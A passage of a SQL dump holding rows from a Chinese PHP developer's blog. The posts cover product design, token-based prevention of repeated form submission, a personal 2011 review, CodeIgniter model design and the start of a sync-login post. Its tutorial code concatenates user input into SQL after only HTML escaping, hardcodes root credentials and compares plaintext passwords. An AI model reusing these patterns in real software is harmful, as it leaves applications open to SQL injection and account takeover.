(75, '关于产品与设计的一点思考', 'some-idea-about-design-and-product', 4, '<p><a href="http://localhost/paperenblog/file/90" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/90" alt="20110915211528" title="上传于2011-09-15"></a></p><p>最近从迷茫中又坚持了下来，而且还获得了其他一些与技术无关的体会，当然这些体会并不是突然冒出来的，或者也跟这1年的工作有关吧。paperen首先抛出自己的观点吧，“一件好的产品必须而且一定是从源设计中继承并得以延伸的”，无论您认同或者反对，或者中立也好，paperen会在下面用自己的体会去描述自己这个观点。so，这是一篇议论文……</p><p>在生活中会不会有这些情景，“我很想弄一个小玩意，能用来这样那样，是啊！很cool啊！”，在想象中确实很吸引很完美，但一旦将其置于实现中就没有下文了，而这种情况paperen认为是很正常的，每个人都爱幻想，而且应该保持幻想，至于能不能实现是其次，因为如果没有这些幻想与这些概念就根本不会有实例的出现，但这里paperen想强调的是，如果连自己（设计思想来源者）都没法做到吸引自己去动手去认为值得实现，那么可能证明了两件事：1.你只是个空幻想家，2.你想象的玩意仍不够吸引。</p><!--more--><p>就拿paperen自己的工作来说，手头上有一大堆要开发的系统，它们是一个有联系的整体，所谓的OA，没开展一个新的系统开发都要进行一系列的折腾，从需求到设计说明，公司很强调这些步骤，paperen也能体谅这些步骤，尽管繁琐但是却是有用，但paperen想说的是，因为这些系统的设计源思想是来自于公司的老总的，他们是对这些系统有着深刻的想象与构思，但他们仅仅是给我们开发人员需求报告，然后就是让我们去构思实例化的过程，paperen想这个步骤是不是有点问题，即使文档方面能弥补部分设计思想与构思不被遗落，但是怎能保证实例化出来的产品就是他们幻想的那个那么美好，正如一开头说的“\r\n一件好的产品必须而且一定是从源设计中继承并得以延伸的\r\n”，如果继承都出了问题那么根本不会有好的产品，paperen觉得必须要有设计来源者参与实例化过程中才能保证这种继承，而文档只能作为后续参与者与想了解产品开发者一个硬生生的参考而已。</p><p>如果设计来源者只是处于这种位置可能带来的结果是很恶劣的，即使有足够多的文档去保证这种设计思想被继承，但是这毫无意义，因为设计来源者始终是被动方，对于实例化操作而言，他们只是提供并告诉实例化人员（开发者）该怎样做该如何改善，而并不是让开发者去继承自己的设计思想，这种主从式的生产方式始终不会获得好的产品（强大生命力的产品），不仅想法没有被继承，反而会打击开发人员的开发热情，他们告诉你这里是方的就是方的，那里是圆的就是圆的，这并不是继承，这是作业，这是填空题~~paperen觉得应该不是这样的，应该是先给你描述一幅很漂亮的画面，然后在亲自给你描上轮廓，而颜色则是由你发挥了，好的开发者能给你选好的颜色，道理就是这样，绝对不是这种主从式的方式。paperen推崇的开发方式应该是源设计者也参与到开发过程中，这样才能带动开发的积极性，而且这种好处绝对比书面型式的文档指引更好，因为源设计能更好地继承下来，更能吸引开发者的积极性，甚至能让他们也会对设计进行自我反思，从而使设计得以延伸。</p><p>paperen没有太多实例，这里只是个人观点，只是个人暂时的观点，不代表日后与未来都会像这样思考这种问题，因为paperen不能保证自己会坚持自己的想法，自己不会很坚持某种观点某种看法，希望这些能给你带来一点点启发与共鸣，paperen也很希望你会告诉我自己的看法。</p><p>仁者见仁智者见智，that''s true</p></p>', 2, 1, 273, 0, 0, 0, 1316092567, 0),
(77, '解决表单重复提交', 'use-token-avoid-repeated-form-submit', 2, '<p>这应该是个很长久的问题……长久得在网上一搜大把解决方案，就是关于如何防止表单重复提交的问题，而paperen这里也就再来解析一下解决的方法与原理，毕竟也是一个实用的技\r\n\r\n术。如果您已经知道如何解决的话那么这篇文章可能不适合你的口味，paperen这里也打算从基础开始讨论，所以希望一步看到解决方案的您也可能不太适合，所以请注意。So~开始吧\r\n\r\n~</p><p>paperen想您一定知道表单是什么吧，form元素就是表单，一般网页需要输入的地方必定使用了表单元素，也很常见，一般的代码如下：</p><pre>&lt;form \r\n\r\nmethod="post"&gt;<br />&lt;p&gt;<br />    &lt;label for="test"&gt;随便输入点什么&lt;/label&gt;<br />    &lt;input type="text" name="data" id="test" /&gt;<br />&lt;/p&gt;<br />&lt;p&gt;<br />    &lt;input type="submit" value="提交" name="submit" /&gt;<br />&lt;/p&gt;<br />&lt;/ul&gt;<br />&lt;/form&gt;</pre><p>重点其实是form与input元素，p元素只是paperen私自加上去的，对后续的说明没有任何影响，其实很简单，所谓input就是输入了，你可以完全将input\r\n\r\n元素理解为是用作用户输入，只是某些属性的（type）不能作为输入而已（这里就是submit），而form元素你完全可以将它理解为是一个袋子，将所有用户输入数据到装在它里面之后用\r\n\r\n来提交回服务端处理，但对于form元素值得注意的是method属性，一般来说有get与post两种方法，其实不要想得太复杂（因为深入的不需要太理解，对于后续的内容没有太多关系，如\r\n\r\n有兴趣不妨可以使用浏览器的调试工具查看请求头部信息与发送信息，例如firebug），表现出来就是，使用get提交表单的话所有的input元素的值将会在地址栏处出现，而post则不会，\r\n\r\n例如使用get提交此表单后的浏览器地址栏</p><!--more--><p>http://localhost/mytest/token/form.php?data=test&amp;submit=%E6%8F%90%E4%BA%A4<br /></p><p>post则在\r\n\r\n地址栏看不到了，使用fiebug可以看到如下信息</p><p><a href="http://localhost/paperenblog/file/91" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/91" alt="20111020210022" title="上传于2011-10-20"></a></p><p>可以简单认为get是显式传送数据的，而\r\n\r\npost则是隐式传送数据的，但还有一个很大区别的是post支持更多更大的数据传送。</p><p>Next，当表单代码写好了，那么让我们来进行服务器脚本的编写（这里就是PHP）。很简单\r\n\r\n~</p><pre>&lt;?php<br />if ( isset( $_POST[''submit''] ) ) {<br />	//表单提交处理<br />	$data = isset( $_POST[''data''] ) ? htmlspecialchars( $_POST[''data''] ) : \r\n\r\n'''';<br />	//Insert or Update数据库<br />	$sql = "insert into test (`string`) values (''$data'')";<br />	//do query<br />	echo $sql;<br />}<br />?&gt;<br /></pre><p>因为这里是post传送数据的，所以使用PHP的$_POST全局变量就能获取到表单提交的数据，所有使用post方法的表单数据提交到服务端都会被保存在这个$_POST全局变\r\n\r\n量中，不妨可以试试print_r( $_POST )这个变量你就明白了。</p><p>首先检查一下是否在$_POST数组里面存在submit，如果存在则证明是表单提交过来的，正如asp.net中好像有个\r\n\r\n叫ispostback的一样，只是这样没那么严谨而已，但是不要紧之后会解决这个问题的。</p><p>之后接收输入框的数据，就是$_POST[''data'']，别忘了使用htmlspecialchars对这个进\r\n\r\n行一下html过滤，因为防止输入了html标签或javascript造成问题(貌似叫做XSS漏洞)。最后就是拼接到sql语句中送入数据库跑了(只是这里paperen并没有很详细使用一些操作数据库的\r\n\r\n函数例如mysql_query，有兴趣自己完成它)。恭喜，到了这里你已经顺利地完成了一个数据录入的功能了，但是有个地方你总得改善吧，插入数据后总得给操作者一个提示吧~~至少提示\r\n\r\n我操作失败还是成功。所以整个代码paperen写成以下样子。</p><pre>&lt;?php<br />if ( isset( $_POST[''submit''] ) ) {<br />	//表单提交处理<br />	$data = isset( \r\n\r\n$_POST[''data''] ) ? htmlspecialchars( $_POST[''data''] ) : '''';<br />	<br />	//connect<br />	mysql_connect( ''localhost'', ''root'', ''root'' );<br />	\r\n\r\n//select db<br />	mysql_select_db( ''test'' );<br />	//设置字符集防止乱码<br />	mysql_query( ''set names "utf8"'' );<br />	//SQL<br />	$sql = "insert \r\n\r\ninto `token` (string) values (''$data'')";<br />	//query<br />	mysql_query( $sql );<br />	<br />	$insert_id = mysql_insert_id();<br />	if ( \r\n\r\n$insert_id ) {<br />		$state = 1;<br />	} else {<br />		$state = 0;<br />	}<br />}<br />?&gt;<p>&lt;?php if ( isset( $state ) \r\n\r\n&amp;&amp; $state ) { //数据插入成功 ?&gt;<br />&lt;p&gt;插入成功 &lt;a href="form.php"&gt;返回&lt;/a&gt;&lt;/p&gt;<br />&lt;?php } else { //失败或者没有插入动\r\n\r\n作 ?&gt;<br />&lt;form method="post"&gt;<br />&lt;p&gt;<br />    &lt;label for="test"&gt;随便输入点什么&lt;/label&gt;<br />    &lt;input type="text" \r\n\r\nname="data" id="test" /&gt;<br />&lt;/p&gt;<br />&lt;p&gt;<br />    &lt;input type="submit" value="提交" name="submit" /&gt;<br />&lt;/p&gt;<br />&lt;/ul&gt;<br />&lt;/form&gt;<br />&lt;?php } ?&gt;</pre><p>html的声明与head还有body都省略了，对比于一开始的代码其实主要是实现了真正插入数据库动作与给出\r\n\r\n了操作反馈(通过$state变量)，不妨自己拷贝代码然后试试(当然请根据自己实际情况修改数据库操作部分的代码)。代码正常，逻辑没问题，但是有个问题，就是在显示插入成功后再刷新页\r\n\r\n面又会执行了表单处理动作，又插了一遍数据！这就是所谓的重复插入问题。在放出解决方案之前您可以自己思考一下该如何解决。</p><p>你会不会认为是接收数据与显示处理结果都是\r\n\r\n这个页面所以才会导致这个问题？也对，也可以这么认为，使用一些调试工具你会发现，浏览器还对post的数据进行了保留，故在提交完表单后再刷新的话该post数据会重新提交了一遍。\r\n\r\n</p><p><a href="http://localhost/paperenblog/file/92" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/92" alt="20111021203151" title="上传于2011-10-21"></a></p><p>如果有办法将浏览器的这个临时保存的post数据清空掉不就解决问题了，但服务端是没法\r\n\r\n做到这点的，因为这是浏览器自身的事情，要么我们就重定向了不然再刷新还是会重复提交数据。<br /></p><p>到目前为止也许你已经了解到重复提交的意思与问题的恶劣所在，如果\r\n\r\n你不是选用重定向的办法那么就得另外想一个办法了，所以令牌解决办法就是这么过来的。</p><p>正如令牌本身代表着权限，操作权，身份标志等等，所以我能不能为我的表单加上这么\r\n\r\n一个身份标志，在客户端每次请求这个表单的时候同时生成一个令牌其挂钩，在提交时再进行判断，正确则接收并处理表单。实现本质就是如此，而反映到具体实现上，就需要用到一种叫\r\n\r\nsession的东西。关于session的解析，<a href="http://zh.wikipedia.org/wiki/会话_(计算机科学)" target="_blank">参见wiki</a></p><p>简单的理解就是session也是一种令\r\n\r\n牌的概念，所以你可能会很惊奇，“什么我已经使用了令牌？！”，是的，但是我们要实现的不仅仅是session而是在其基础上附加一些数据来实现我们想要的表单令牌。So let''s do it！\r\n\r\n</p><p>session在php中也是被存放在$_SESSION这个超级全局变量里面的，启用起请使用session_start()，关于其他服务端脚本原理一样，只是可能调用方法名不一致而已。加入\r\n\r\ntoken后的代码如下：</p><pre>&lt;?php<br />//开启session<br />session_start();<br />if ( isset( $_POST[''submit''] ) &amp;&amp; valid_token() ) {<br />    //表单\r\n\r\n提交处理<br />}<br /><br />/**<br /> * 生成令牌<br /> * @return string MD5加密后的时间戳<br /> */<br />function create_token() {<br />    //当前时间戳<br />    \r\n\r\n$timestamp = time();<br />    $_SESSION[''token''] = $timestamp;<br />    return md5( $timestamp );<br />}<br />/**<br /> * 是否有效令牌<br /> * @return bool \r\n\r\n<br /> */<br />function valid_token() {<br />    if ( isset( $_SESSION[''token''] ) &amp;&amp; isset( $_POST[''token''] ) &amp;&amp; $_POST[''token''] == md5( \r\n\r\n$_SESSION[''token''] ) )<br />    {<br />        //若正确将本次令牌销毁掉<br />        $_SESSION[''token''] = '''';<br />        return true;<br />    }<br />    return false;<br />}<br />?&gt;<br />&lt;?php if ( isset( $state ) &amp;&amp; $state ) { //数据插入成功 ?&gt;<br />&lt;p&gt;插入成功 &lt;a href="form.php"&gt;返回\r\n\r\n&lt;/a&gt;&lt;/p&gt;<br />&lt;?php } else { //失败或者没有插入动作 ?&gt;<br />&lt;form method="post"&gt;<br />&lt;p&gt;<br />    &lt;label for="test"&gt;随便\r\n\r\n输入点什么&lt;/label&gt;<br />    &lt;input type="text" name="data" id="test" /&gt;<br />&lt;/p&gt;<br />&lt;p&gt;<br />    &lt;input type="submit" value="提\r\n\r\n交" name="submit" /&gt;<br />&lt;/p&gt;<br />&lt;/ul&gt;<br />&lt;!-- Token --&gt;<br />&lt;input type="hidden" value="&lt;?php echo create_token(); //生成\r\n\r\n令牌 ?&gt;" name="token" /&gt;<br />&lt;!-- Token --&gt;<br />&lt;/form&gt;<br />&lt;?php } ?&gt;</pre><p>部分代码paperen这里省略，因为并不是重点，其实加的\r\n\r\n东西只有3处：</p><p>第一，在表单结束前加入了一个input元素，记得type为hidden（隐藏域）</p><p>第二，增加了两个函数，create_token与valid_token，前者用来生成令牌\r\n\r\n的后者用来验证令牌的</p><p>第三，在if中多加一个条件，valid_token</p><p>那就大功告成了，很简单，而且所有的东西都聚集在新加的两个函数中。paperen这里使用的令牌很\r\n\r\n简单就是时间戳，将请求表单时的时间戳存储到$_SESSION[''token'']中，那么验证令牌就明白了，就是检查客户端提交过来的$_POST[''token'']是否与md5后的$_SESSION[''token'']一致\r\n\r\n就行了，当然还要加上存在$_POST[''token'']与$_SESSION[''token'']这两个变量才行。</p><p>你可以将这个简单的令牌模式封装得更加棒并扩展一下功能，例如加上表单提交超时验证\r\n\r\n也是个不错的动手机会。</p><p>最后附上之前paperen扩展codeingeter的Form_validation类文件，主要是扩展上令牌与表单超时。压缩包中welcome.php是控制器文件，请放置到\r\n\r\napplication\\controller中(如不想增加这个控制器可以打开然后将token方法复制下来放到已有的其他控制器中)；MY_Form_validation.php请放到application\\libraries中。<br /></p><p><a href="http://iamlze.cn/demo/token/form_validation_token.rar" target="_blank">附件地址</a></p></p>', 2, 1, 419, 1, 0, 0, 1319272310, 0),
(80, '年总结Summary', '2011-year-summary', 1, '<p>一年又是那么一下子结束掉，还觉得自己好像是毕业没多久。2011这个数字对于我来说也算有点意义，因为是从大学混到社会的一年。我只知道在这一年中自己某些人生观、对待某些事情的看法上确实有了变化，但无法告诉你那是什么，似乎这样的话很无解，但确实是这样的。</p><p>我通常不会将自己的生活描述得太过于好，但也不会描述得太过于差，当偶尔在TM上有大学朋友问我过得如何时，我通常是使用“我过得不错（很好）”来回答，我想这是一个很好的消息，无论是对他还是对自己，或许这也是乐观的表现，但老实来说没有什么理由说自己过得不好，做到自己感兴趣工作的同时还赚到钱，能租到自己可以接受的房子，而且在深圳还有亲戚关照，还有什么不好。</p><p>有时候在微博上或者是在与别人交流中总是能了解到一些关于价值观与人生观，但自己并不会很轻易就接受那些所谓的观点，或许我是变得保守了，我不知道这算不算是成熟，我只是想问问有多少人觉得自己是个很无趣的人。</p><!--more--><p>我的手机还是很沉默，没有打出去的也没有打过来的，24小时里除了闹铃与来自10086的短信，其他时间仿佛是感觉不到手机的存在，或许这证明了自己的圈子确实是太窄了，又或许这证明了自己并不是那种受欢迎的人。对于这种事情上自己偶尔会觉得自己没太多存在感，但是久而久之我就已经看透了，或许说是自暴自弃了。</p><p>社交圈子上没有丝毫扩大，我还是活在自己的世界里，我还是带着主观的眼光去观看这个世界一切。有时候我也想生活上活跃点，但是改变对于自己来说实在是一个难题，跟陌生人交往自己还是略显得缺乏自信。</p><p>音乐技能上，我想我终于可以不在C调上弹奏了，但是五线谱仍然没有熟悉，或许大家觉得很神奇，到底你怎么弹奏的，我的回答是我是按照感觉来弹的，我始终认为我是有那么一点音乐天赋的。而偶尔我又会怀念起我的吉他。</p><p>对于工作，一天24小时里面我在公司的时间至少有13、14个小时，当然并不是说工作了这么久，午休那还是有的，或许这能解析为什么自己的圈子这么窄了，这也能给自己一个借口。我会在脑子里模拟一些情景，例如当别人问起自己怎么圈子这么窄时，我就可以说出自己的工作时长来帮自己解说，你看我每天用了一半时间在工作上，我这么勤劳当然圈子就这么窄了，然后他们就说我是工作狂，而不会觉得我是那种奇怪而且没趣的人，我又会模拟他们问我在公司这么时间干什么的问题，我说我在写代码搞东西，他们就应该会沉默起来了。</p><p>我想我在回答这种问题的时候自己也会很颤抖，我会反问自己我真的有这么勤劳吗？貌似是这样的吧，但是有时候却是看不到什么进度，这种问题我总是很难解析的，久而久之我会避免跟老总们的眼神接触，或许是自己感到惭愧，并不是自己写的代码不好也不是自己架构的东西不好，我还是缺乏自信，因为我知道每当我将自己开发的东西拿出来或者是发布的时候，总会有那么一些人觉得做得还不够（包括我自己）。</p><p>我在公司的职位上是技术主管（开发部其实就3人），我总避免跟同事交流的时候使用那种语气与架势，我不会称呼同事为小什么，小什么的，听起来别扭而且很操蛋。我们都是直接叫名字的。</p><p>同时我又是一个假慈悲的主管，我有时会抱怨团队成员写代码的进度实在太低以至于自己动手去帮他们赶进度，有时候就是觉得他们智力是不是有点低，连个netbeans都用不好…操作速度太慢，太容易分散注意力了，但我也不是说团队成员能力不够，团队不好，自己知道这些抱怨也就是偶尔来一下，就像女人那个什么似的而已。我明白年轻人想法总是很多，当他们上手了php时就开始怀疑是不是应该要向java进军了，当他们玩上CI就怀疑是不是应该要熟练zend，但我更注重的是心态，我告诉他们我懂的就是一门语言php，我想如果你没有那种心态与目标即使你使用上最牛叉的语言也是徒然，在代码的世界里，我追求的并不是哪门语言更加牛叉，而是解决问题的思路与对问题的理解，语言不是最重要的，我经常向他们这样说，可惜没人会听进去，当然这没什么，听不进去其实也是很正常的事情，我相信某些搞技术的人有那么一种特性，往往越相识的人告诉你他的经验你就越不相信，他们宁愿相信从一个无名氏发表的帖子，宁愿相信一个完全不认识的所谓的牛人写的博客，都不会相信在他面前直接告诉自己经验与真理的人，我不知道这叫做自信过度还是什么变态心理学。</p><p>我还是很enjoy写代码的世界里，我不单单乐于写php代码我还乐于写js，css，html，然后到数据库的索引、触发器等等，我也乐于参与界面设计，也乐于写写详细技术文档，我最近那个项目就写了1万多字的详细设计说明，别人可能就是认为我是ctrl+c然后ctrl+v出来的，但我确实是一字一句敲出来的，而至于有没有人看完我还真不知道，我只想为了后继的程序员提供一些方便，以便其对设计的理解，也有使用上svn与phpdocument作为团队开发的辅助工具，现在觉得还真离不开这些工具了。有时候我更觉得自己适合做一名代码农民工，有个大屏幕在netbeans里面就是那样敲代码，但是想想我还是想做架构的那个人，因为那个更有意思，那感觉就像是以前买来一盒高达模型，躲在房间里面将一片片塑料，拼成一个高达，然后就自娱自乐在床上模拟一个战场来场高达大战。开发就是很有意思的事情，当然我更喜欢将开发出来的东西做得更精美，被别人使用上，开发者最喜欢看到自己的东西被别人使用了，这是所有开发者的共性。</p><p>对于爱情也没有任何收获，在分析了自己的性格与工作时间后就会觉得没有女朋友是必然的。但令自己惊奇的是我竟然对在公交上常遇到的某位女孩子动了心，还神奇到那天竟然考虑很久后傻傻地问她拿手机号，原本不是问手机号的，是打算问她要微博的，结果好像被误会了，拒绝了，然后她也就刚好到站了，走了。之后想了想，靠，她会是怎么想，我这不就是流氓么…为了这事情短路了一些时间，之后又自然而然地愈合了，因为没怎么看到她，也害怕见到她，之后在微博上又看到一句“如果要是有人说第一眼就看上你了，揍他吧，那是想和你上床的另一种表达方式”，虽然我没有认同但是我表示很无语…好吧，以后还是不这么傻了吧。</p><p>深圳是个很富有的城市，富有到有时候我无所适从某些人的对话，我无法认同从他们的交谈中无时无刻散发出的观念，我在公交车上看到的所有打扮稍微时髦点的女孩子手机都是iphone，那些什么圣诞广告“爱我就送我smart”。我脑里面有很多疑问，我想知道自己到底是一个什么样的人，我有时候会因为没有帮助某人而感到自责，我会觉得我其实也是一个冷血的人但我很想证明我不是。</p><p>我还记得很久之前自己写的一篇博客，叫写给26岁的自己，事到如今我已经差不多25了，作下承诺简单但是实现起来却是很难，我明白到人生的难题就是战胜自己，我明白到以前的高考中考成绩其实都是枉然，但是我经常会怀念过去读书的呆板但纯真的美好时光。我似乎知道很多东西，但是又告诉自己其实自己只是一知半解，我善于对自己使用心理暗示与压抑自己。</p><p>下一年计划与愿望…</p><p><ul><li>我想我可能会离开目前的公司，我打算去大一点的公司，开发团队人员更多的公司体会一下，自己在这一年做主管的时光里，就像是邓小平那句“摸着石头过河”，在性格上自己确实仍不符合作为一名主管，有些时候我会觉得自己对工作做得仍未够，开发速度仍未够快，仍未够好，我现在已经开始害怕后继的程序员在阅读自己这个架构与代码时的感觉，我仍然想去优化一下某些部分，但是时间上好像就总不够，或许我终于找到了一点理由让自己离开目前这个公司，但是我不敢在去想这个问题，因为我怕我又会打消这个主意，我相信一个真理，环境并不会影响你自身的发展与提高，其实在目前的公司也是一个很好的机遇，就看你怎样理解了。</li><li>微博应用的开发，我已经想拿微博开发者那个勋章很久了！</li><li>还是urlazy，它在我心目中如此的重要</li><li>自己博客的重构</li><li>学习一门新语言，之前已经看过python但是一直没有动手弄个东西，我想可以帮妈妈弄个东西辅助她管理辅导社的学生登记</li><li>买个洗衣机…</li><li>买个台式！我要大屏！我要装linux系统</li><li>吉他也得玩起</li><li>如果可以的话我还想要那个女孩子的手机号…</li></ul></p>', 2, 1, 224, 2, 0, 0, 1325268380, 0),
(79, '关于控制器与模型间的一些想法', 'some-idea-about-controller-and-model', 4, '<p>用CI也有一段时间了，感觉paperen我也挺喜欢CI的，因为觉得上手真的很容易也很方便，暂时还不会考虑其他框架。不过通过这段时间的使用，加上同事比较多疑问（也算是好事吧），自己也有点对CI中控制器与模型部分使用产生些少疑问，特别是模型，因为之前的开发就带来一些比较混乱的状况，老实说之前写的代码比较糟糕。</p><p><a href="http://localhost/paperenblog/file/93" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/93" alt="20111122011355" title="上传于2011-11-22"></a></p><p>很多疑问都是产生在控制器与模型之间的，疑问最严重的是模型的重用性（况且可以这么说吧），平平君与奇奇君本来是分开一人负责一块功能的，但是免不了要涉及一些公用的模型，这就导致了一些不能避免的问题，平平君要与奇奇君协商某个公用的模型方法，但是别扭的是前者可能额外附件一些条件，比如要查询state为3的记录而后者则又会附加其他限制条件，而且paperen不太同意在控制器中对模型进行控制（或者下面的例子展示后你就明白什么意思），结果要写一个能符合两者需求的模型方法，在这个模型方法中写了比较复杂的逻辑，本来比较简单的模型突然看到一段复杂的逻辑，这个真的是我不想要的，paperen提议的是即使你查询的条件不同的话就可以考虑分出来单独作为一个方法了，而不要花太多时间在万能的模型方法，因为那可能会增加了模型的复杂度或者增加了控制器与模型的耦合度。说了这么多还不如看个例子吧。</p><!--more--><pre>/**<br /> * 用户模型<br /> */<br />class User_model extends CI_Model<br />{<br />    /**<br />     * table映射<br />     * @var array<br />     */<br />    private $_table = array(<br />        ''user'' =&gt; ''user'',<br />        ''group'' =&gt; ''group'',<br />    );<br /> <br />    /**<br />     * 字段映射<br />     * @var array<br />     */<br />    private $_fields = array(<br />        ''user'' =&gt; array(<br />            ''id'' =&gt; ''id'',<br />            ''username'' =&gt; ''username'',<br />            ''password'' =&gt; ''password'',<br />            ''groupid'' =&gt; ''groupid'',<br />        ),<br />        ''group'' =&gt; array(<br />            ''id'' =&gt; ''id'',<br />            ''name'' =&gt; ''name'',<br />        ),<br />    );<br /> <br />    /**<br />     * 根据用户ID查询用户信息<br />     * @param int $userid 用户ID<br />     * @return array 用户数据<br />     */<br />    public function get( $userid )<br />    {<br />        return $this-&gt;db-&gt;from( $this-&gt;_table[''user''] )<br />                        -&gt;where( $this-&gt;_fields[''user''][''id''], $userid )<br />                        -&gt;get()<br />                        -&gt;row_array();<br />    }<br /> <br />    /**<br />     * 用户验证<br />     * @param string $username 用户帐号<br />     * @param string $password 用户密码<br />     * @return array 用户数据<br />     */<br />    public function verify( $username, $password )<br />    {<br />        return $this-&gt;db-&gt;from( $this-&gt;_table[''user''] )<br />                        -&gt;where( $this-&gt;_fields[''user''][''username''], $username )<br />                        -&gt;where( $this-&gt;_fields[''user''][''password''], $password )<br />                        -&gt;get()<br />                        -&gt;row_array();<br />    }<br /> <br />    /**<br />     * 在控制器中就决定查询哪些字段决定where<br />     * @param arrray $where 限制条件<br />     * @param string $select 查询字段<br />     * @return array 查询结果<br />     */<br />    public function get2( $where, $select = ''*'' )<br />    {<br />        return $this-&gt;db-&gt;select( $select )<br />                        -&gt;from( ''user'' )<br />                        -&gt;where( $where )<br />                        -&gt;get()<br />                        -&gt;row_array();<br />    }<br />}<br /></pre><p>控制器</p><pre>class Home extends CI_Controller<br />{<br />	public function test()<br />	{<br />	//引入用户模型<br />        $this-&gt;load-&gt;model( ''user_model'' );<br /> <br />        //用户ID<br />        $userid = 1;<br />        //用户名<br />        $username = ''test'';<br />        //用户密码<br />        $password = ''test'';<br /> <br />        //get<br />        //获取确定ID的用户数据<br />        <br />        $user_data = $this-&gt;user_model-&gt;get( $userid );<br /> <br />        //verify<br />        //验证用户是否合法<br />        $valid_user = $this-&gt;user_model-&gt;verify( $username, $password );<br /> <br />        //get2<br />        //在控制器中可以决定查询的限制条件<br />        //不需要查询到password字段<br />        $select = ''id,username'';<br />        //条件<br />        $where = array( ''id'' =&gt; $userid );<br />        $user_data = $this-&gt;user_model-&gt;get2( $where, $select );<br /> <br />        //get2<br />        //比如登陆验证时还可以重用get2这个方法<br />        $where = array( ''username'' =&gt; $username, ''password'' =&gt; $password );<br />        $valid_user = $this-&gt;user_model-&gt;get2( $where );<br />	}<br />}</pre><p>前面模型那些什么映射大家可以不用管，其实没太大用途只是paperen个人感觉而已，主要看get、verify与get2这三个方法，get是根据用户ID获取用户数据、verify是根据用户帐号与密码去验证用户是否存在、get2则无从解析因为它灵活度很大，你可以决定where也可以决定查询的字段，听起来get2更好对不，但是事实上paperen不认同get2这样的写法，因为这样做导致的一个问题就是，模型已经不再是模型了，因为主动权不在自己手上，看看在控制器中我们是如何调用这个get2查询的</p><p>$select = ''id,username'';<br />$where = array( ''id'' =&gt; $userid );<br />$user_data = $this-&gt;user_model-&gt;get2( $where, $select );<br /></p><p>你必需知道这代表了什么，我在控制器中已经控制限制了模型，那为什么还需要模型呢，如果我数据结构更改了，我们将要修改的不是模型而是修改控制器，MVC的味道似乎已经没了。所以papern还是推荐get、verify这样的写法，确实没有get2灵活但是这样才保证了MVC味道所在，在这个面前坚持将sql的控制放回到模型是必需的。</p><p>而后来paperen又再封装了控制器调用模型时的处理，因为原来在控制器中调用某个模型的方法时，一般要手动加载相关的模型（除非你开始时就已经将所有模型引入）</p><p>\r\n$this-&gt;load-&gt;model( ''user_model'' ); </p><p>然后要调用某个方法时</p><p>\r\n$this-&gt;user_model-&gt;get( $userid );\r\n</p><p>paperen想这里再封装一下就更好了，于是我扩展了CI_Controller控制器类，在它基础上加入了一个魔法方法__call</p><pre>/**<br />     * 魔法方法 减少模型与控制器之间的耦合度<br />     * @param string $name 调用的模型的方法名 规则为 model_+模型名称+模型方法<br />     * @param mixed $arguments 参数<br />     * @return mixed<br />     */<br />    private function __call( $name, $arguments )<br />    {<br />        $tmp = explode(''_'', $name);<br />        if ( count($tmp) == 3 &amp;&amp; strtolower( $tmp[''0''] ) == ''model'' )<br />        {<br />            $modelName = "{$tmp[1]}_model";<br />            $modelMethod = $tmp[2];<br />            if ( !isset( $this-&gt;$modelName ) ) $this-&gt;load-&gt;model( $modelName );<br />            return call_user_func_array(array($this-&gt;$modelName, $modelMethod), $arguments);<br />        }<br />        else<br />        {<br />            return '''';<br />        }<br />    }</pre><p>大家可以试试这样做是不是比较好，那么上面的两句代码完全可以变成一句了</p><p>$user_data = $this-&gt;model_user_get( $userid );</p><p>而且我们只要预先将模型中的方法都定好那么写控制器的人对着相应的模型方法解析文档就可以展开自己的编码，完全不会影响也不会干涉到模型这边，都告诉你这个方法返回什么数据了，你就用这些数据去完成你的逻辑与流程好了。这样也就貌似很好了。</p><p>好吧，就到此为止，困了~~</p><p>不过最后paperen想再次提醒一下写代码的人三句（包括myself）“要多去想想如何能在代码中更偷懒更好看更能重用，不要做一个被后继接手程序员骂的程序员，你写代码是为了实现什么功能”。</p></p>', 2, 1, 220, 0, 0, 0, 1321967995, 0),
(81, '同步登陆', 'sync-login', 2, '<p><a href="http://localhost/paperenblog/file/94" class="post-image thumbnail"><img src="http://localhost/paperenblog/file/94" alt="20120104211336" title="上传于2012-01-04"></a></p><p>这不是什么新的技术，所以如果你已经知道如何实现可以忽略此博文了。</p><p>关于同步登陆的需求，大网站可能有几个子网站或者是子系统，不能设计成每次进入其他子网站就登陆一次，而应该是在子站点登陆了就可以漫游于其他子站点，当然用户帐号与密码也应当保持一致。</p><!--more--><p>当需求明确后而且你对登陆这个概念有理解的话，那么你完全可以动手了。</p><p>我们通常说的登陆与登出，反应到应用上就是一种标识符（令牌），web访问方式是无状态的（至少目前是这样的），请求方请求某个页面服务器才去帮他找到页面并解析返回，而如果要给用户一个标识符，我们往往是使用session或者是cookie，更多是前者。</p><p>更多关于session的资料，<a href="http://zh.wikipedia.org/wiki/%E4%BC%9A%E8%AF%9D_(%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6)" target="_blank">wiki</a></p><p>正如php里面简单的一句：session_start()，已经代表此页面启动了session，不妨echo一下session_id()，这个就是服务器给你的一个标识符，如果你不关闭浏览器即使刷新页面这个标识符仍然不变。</p><p>而对于我们应用中判断用户登陆的话一般是在session的基础上去装载了我们自定义的一些信息，比如登陆验证成功后往session中装入一些数据，之后应用就判断session中是否存在这些数据并以此作为判断用户是否登陆。</p><pre>$_SESSION[''userid''] = 1;//简单一句就可以了</pre><p>故判断用户是否登陆的问题只变成了检查session里面是否存在userid并且这个数据是否正确则可。</p><pre>if( isset( $_SESSION[''userid''] ) &amp;&amp; checkUser( $_SESSION[''userid''] ) )</pre><p>关于登陆的理解也就到此为止，而再来看回这个同步登陆功能的话，思路应该就更加明确了，说白了就是让其他子站点也为访问者初始化session数据，而这点是如何做到的，使用javascript。</p><p>同事之前打算使用curl，如果你以为是要由某个站点帮你去登陆其他应用那么你是对概念没理解，特别是session的概念，你要让别的子站点也承认客户端当然是要让客户端发出请求，服务端给请求方生成并初始化标识符，而不能使用curl，让服务端给你去完成其他系统的登陆，如果服务端去访问其他系统的话，那个标识符并不是客户端的，而是给服务端的，所以这就是使用curl行不通的地方。</p><p>解决方案很简单就是在任何一个子系统登陆时，会输出几个js调用声明（需要同步几个系统就有几个）</p><pre>&lt;script src="http://localhost/otherApp1/login/sync/?uid=1"&gt;&lt;/script&gt; &lt;script 